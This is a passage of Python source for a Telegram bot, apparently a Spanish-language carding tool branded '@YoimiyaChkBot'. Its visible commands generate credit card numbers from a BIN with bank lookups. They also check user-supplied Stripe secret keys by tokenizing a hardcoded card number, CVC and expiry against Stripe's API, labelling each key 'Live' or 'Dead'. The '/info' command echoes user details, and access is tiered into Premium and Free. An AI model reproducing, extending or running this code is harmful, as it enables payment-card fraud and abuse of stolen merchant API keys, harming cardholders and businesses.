    cards4 = ''.join(cc4)
    cards5 = ''.join(cc5)
    cards6 = ''.join(cc6)
    cards7 = ''.join(cc7)
    cards8 = ''.join(cc8)
    cards9 = ''.join(cc9)
    apis187 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    result=apis187['status']
    banke=apis187['bank']
    bank=banke['name']
    brand=apis187['brand']
    bn=apis187['query']
    typ=apis187['type']
    lv=apis187['level']
    country1=apis187['country']
    country=country1['name']
    flag=country1['flag']
    bin1 = await message.reply(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    bin2 = await bin1.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [50%]</b>")
    time.sleep(3)
    bin3 = await bin2.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    bin4 = await bin3.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")

    if ID in admins:
        return await bin4.edit_text(f"""
- - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 - ↯ <code>{bn} - {brand} - {typ} - {lv}</code>
𝑩𝒂𝒏𝒌 - ↯ <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 - ↯ <code>{country} - {flag}</code>
- - - - - - - - - - - - - - - - - - - - -
<code>{cards2}</code>
<code>{cards3}</code>
<code>{cards4}</code>
<code>{cards5}</code>
<code>{cards6}</code>
<code>{cards7}</code>
<code>{cards8}</code>
<code>{cards9}</code>
- - - - - - - - - - - - - - - - - - - - -
𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱𝘀 𝗕𝘆 - ↯ <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
𝗠𝗼𝗻𝘁𝗼 {amount}
𝗢𝘄𝗻𝗲𝗿: @DiegoAkk
 """)

    else:
        (f"""
- - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 - ↯ <code>{bn} - {brand} - {typ} - {lv}</code>
𝑩𝒂𝒏𝒌 - ↯ <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 - ↯ <code>{country} - {flag}</code>
- - - - - - - - - - - - - - - - - - - - -
<code>{cards2}</code>
<code>{cards3}</code>
<code>{cards4}</code>
<code>{cards5}</code>
<code>{cards6}</code>
<code>{cards7}</code>
<code>{cards8}</code>
<code>{cards9}</code>
- - - - - - - - - - - - - - - - - - - - -
𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱𝘀 𝗕𝘆 - ↯ <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
𝗠𝗼𝗻𝘁𝗼 {amount}
𝗢𝘄𝗻𝗲𝗿: @DiegoAkk
 """)

@iniciar.message_handler(commands=["info", "id", "me"], commands_prefix=comand)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    ID = message.from_user.id
    if ID in admins :
        Prm = "[Premium]"
        await message.reply(f'''
━━━━━━━━━━━━━
🔱 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿 🔱
━━━━━━━━━━━━━
[Ϟ] 𝗜𝗱 𝗨𝘀𝗲𝗿: <code>{user_id}</code>
[Ϟ] 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}
[Ϟ] 𝗕𝗼𝘁: @YoimiyaChkBot
[Ϟ] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk
[Ϟ] 𝑰𝒏𝒇𝒐 𝑩𝒚: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
''')
    else:
        await message.reply(f"""
━━━━━━━━━━━━━
🔱 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿 🔱
━━━━━━━━━━━━━
[Ϟ] 𝗜𝗱 𝗨𝘀𝗲𝗿: <code>{user_id}</code>
[Ϟ] 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}
[Ϟ] 𝗕𝗼𝘁: @YoimiyaChkBot
[Ϟ] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk
[Ϟ] 𝑰𝒏𝒇𝒐 𝑩𝒚: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>""")


@iniciar.message_handler(commands=['sk'], commands_prefix=comand)
async def helpsjjtr(message: types.Message):
    skkey = message.text[len('/sk '):]
    if not skkey:
        return await message.reply(
            f"""
<b>Ingresa bien la sk bb, ejemplo: </b>: <code>/sk sk_live_51Gnxxxxxxxxxxxxxxxxxxxxxxxxxxhrh8</code>
""")
    cc= "4543218722787334"
    cvc= "780"
    mes= "07"
    ano= "2026"

    headers={
    "Content-Type": "application/x-www-form-urlencoded"
    }

    data={
    "card[number]": cc,
    "card[cvc]": cvc,
    "card[exp_month]": mes,
    "card[exp_year]": ano
    }
    

    first = message.from_user.first_name
    ID = message.from_user.id
    bi = await message.reply(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    bi2 = await bi.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [40%]</b>")
    time.sleep(3)
    bi3 = await bi2.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    time.sleep(2)
    bi4 = await bi3.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")
   
    pos = requests.post(f"https://api.stripe.com/v1/tokens",
        data=data, headers=headers, auth=(skkey, ""))
    if 'Invalid API Key provided' in pos.text:
        if ID in admins :
            await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid API Key provided</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
        else:
            await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid API Key provided</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    elif 'api_key_expired' in pos.text:
        if ID in admins :
            await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>api_key_expired</b><
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}/a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
        else:
              await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>api_key_expired</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)

    elif 'testmode_charges_only' in pos.text:
        if ID in admins :
            await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>testmode_charges_only</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
        else:
              await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>testmode_charges_only</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    elif 'test_mode_live_card' in pos.text:
            if ID in admins :
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>test_mode_live_card</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
            else:
              await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>test_mode_live_card</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    else:
        if ID in admins :
            await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝗟𝗶𝘃𝗲 ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Sk_Live! ✅</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
        else:
              await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝗟𝗶𝘃𝗲 ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Sk_Live! ✅</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    
